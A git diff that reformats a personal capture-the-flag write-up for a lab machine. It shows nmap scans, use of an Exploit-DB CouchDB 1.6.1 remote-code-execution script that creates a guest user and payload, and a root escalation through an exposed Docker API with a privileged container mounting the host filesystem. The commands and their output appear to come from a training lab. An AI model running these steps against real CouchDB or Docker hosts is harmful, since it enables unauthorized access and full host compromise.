@@ -1,3 +1,4 @@
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap 10.10.171.240           
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 10:25 EDT
@@ -8,7 +9,8 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 
 Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
-                                                                                                                                                                         
+```                                                                                                                
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sCV -p- -Pn --open --min-rate 5000 -T5 -vv 10.10.171.240
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -102,9 +104,9 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 605.24 seconds
   
   
-  
-ohhhhhhh fuck
-
+```
+ohhhhhhh f***
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sCV -p- -Pn -T5 -v 10.10.171.240 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -176,27 +178,28 @@ Nmap done: 1 IP address (1 host up) scanned in 387.47 seconds
   
   
 {"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
-
+```
 
 
 https://www.exploit-db.com/exploits/44913
 
 couchdb.py
 
-                        ┌──(kali㉿kali)-[/hackme/scripts]
+```bash
+┌──(kali㉿kali)-[/hackme/scripts]
 └─$ python couchdb.py --priv -c "id" http://10.10.171.240:5984                                                                         1 ⨯
 [*] Detected CouchDB Version 1.6.1
 [+] User guest with password guest successfully created.
 [+] Created payload at: http://10.10.171.240:5984/_config/query_servers/cmd
 
                                                   
-                                                                                                                                                 
+    
 ┌──(kali㉿kali)-[/hackme/scripts]
 └─$ python couchdb.py --priv -c "ef680bb740692240059420b2c17db8f3" http://10.10.171.240:5984                                                                         1 ⨯
 [*] Detected CouchDB Version 1.6.1
 [+] User guest with password guest successfully created.
 [+] Created payload at: http://10.10.171.240:5984/_config/query_servers/cmd
-
+```
 
 
 
@@ -232,7 +235,7 @@ didn't work, trying to see if i could modify a bit ,,,
 
 from history
 
-
+```bash
 sudo -s
 cd /etc/apt/
 rm sources.
@@ -296,7 +299,10 @@ sudo deluser USERNAME sudo
 sudo deluser atena sudo
 exit
 sudo -s
-docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine     *******************************look dumbass******************************
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine     
+```
+
+**look dummy**
 uname -a
 
 
@@ -304,7 +310,7 @@ uname -a
 
 just run the docker command from history file,,,,,   wow, ,, , , , , , 
 
-
+```bash
 atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
 / # cat /root/root.txt
 cat: can't open '/root/root.txt': No such file or directory
@@ -332,7 +338,7 @@ atena
 root.txt
 /mnt/root # cat root.txt
 THM{RCE_us1ng_Docker_API}
-
+```
 
 
 
